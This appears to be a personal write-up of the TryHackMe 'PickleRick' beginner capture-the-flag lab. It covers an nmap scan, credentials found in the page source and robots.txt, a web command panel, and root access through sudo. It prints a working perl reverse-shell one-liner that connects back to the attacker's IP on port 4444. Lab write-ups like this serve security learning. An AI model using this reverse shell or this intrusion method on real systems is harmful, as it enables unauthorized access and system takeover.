# TryHackMe-PickleRick CTF
Abdullah Rizwan ,21 August , 09:35 PM

PickleRick is a free beginner level webapplication kinda CTF.

## NMAP
Like always we are going to fire up our nmap scan on the box to look for open ports

```
nmap -T4 -A -p- 10.10.208.39
```
Here
-T4 tells the speed of scanning 
-A  tells to look for all 
-p- tells to look for ports

and in the end is the box ip (machine ip)

<a href="https://imgur.com/SDGCB0V"><img src="https://i.imgur.com/SDGCB0V.png" title="source: imgur.com" /></a>

Here we can see that there are 2 open ports

SSH (22)
HTTP (80)

So first we will try to exploit HTTP

<a href="https://imgur.com/QUpMxwe"><img src="https://i.imgur.com/QUpMxwe.png" title="source: imgur.com" /></a>

This is the home page that is loaded upon entering the ip address.



<a href="https://imgur.com/GmtVzO3"><img src="https://i.imgur.com/GmtVzO3.png" title="source: imgur.com" /></a>

If we try to look at the source we can see Wubbalubbadubdubthat it's telling us that there's a user named *"R1ckRul3s*" so we are going to use it later when we try to ssh are way into the box.

## Port 80

<a href="https://imgur.com/GmtVzO3"><img src="https://i.imgur.com/GmtVzO3.png" title="source: imgur.com" /></a>

I tried to see if "robots.txt" was accessable and what I found was a text "Wubbalubbadubdub" , i don't know what it means by lets see what elese we can find.

<a href="https://imgur.com/2oUzEDd"><img src="https://i.imgur.com/2oUzEDd.png" title="source: imgur.com" /></a>

### Dirbuster

On bruteforcing directory we find out that there is a login page on the website 



<a href="https://imgur.com/POimBHs"><img src="https://i.imgur.com/POimBHs.png" title="source: imgur.com" /></a>



<a href="https://imgur.com/Xpwynbf"><img src="https://i.imgur.com/Xpwynbf.png" title="source: imgur.com" /></a>

On submitting the username and the text we found on robots.txt we are able to login to the potral

<a href="https://imgur.com/56hyQT8"><img src="https://i.imgur.com/56hyQT8.png" title="source: imgur.com" /></a>

From here we can execute commands like "pwd" or "whoami" which will give result of these commands so we can use this as a shell.

<a href="https://imgur.com/pl7RhmL"><img src="https://i.imgur.com/pl7RhmL.png" title="source: imgur.com" /></a>

On the current directory on giving "ls" command we can see what is that current directory also on looking at the source of the page we can find a base64 text but it doesn't really decode into something.

<a href="https://imgur.com/XqGmf1o"><img src="https://i.imgur.com/XqGmf1o.png" title="source: imgur.com" /></a>

But we still can't access the files on the webpage.

I headed over to pentest monkey

<a href="https://imgur.com/2akwyJK"><img src="https://i.imgur.com/2akwyJK.png" title="source: imgur.com" /></a>

Tried the nc(netcat),php,bash,python2 reverse shell but they didn't work so then i tired the perl reverse shell however we can use python3 instead of python2 to execute python reverse shell.
```
perl -e 'use Socket;$i="10.8.94.60";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

<a href="https://imgur.com/mlpDKJg"><img src="https://i.imgur.com/mlpDKJg.png" title="source: imgur.com" /></a>

It gave me a reverse shell on my terminal.

### First Ingredient

So now for the first ingredient I had no problem in viewing "Sup3rS3cretPickl3Ingred.txt".

### Second Ingredient

For second ingredient I moved around the directories and found something named "second ingredients".

<a href="https://imgur.com/DjlG05n"><img src="https://i.imgur.com/DjlG05n.png" title="source: imgur.com" /></a>

For viewing this file as there is a space in between so in linux you have to use '\ ' backslash + space for entering second string of a file.

### Third Ingredient

For the third ingredient there are two ways:

1) Since we can ran any command by writing "sudo" before it so one way is to look into "ubuntu" folder and there we have a file called ".bash_history"

<a href="https://imgur.com/QMFyVvs"><img src="https://i.imgur.com/QMFyVvs.jpg" title="source: imgur.com" /></a>

2) Another method for getting the third ingredient is by accessing "root" folder.

<a href="https://imgur.com/b7SOPCc"><img src="https://i.imgur.com/b7SOPCc.jpg" title="source: imgur.com" /></a>

3) Or you can run "sudo bash" , that would make you a root user.

You have successfully completed this CTF.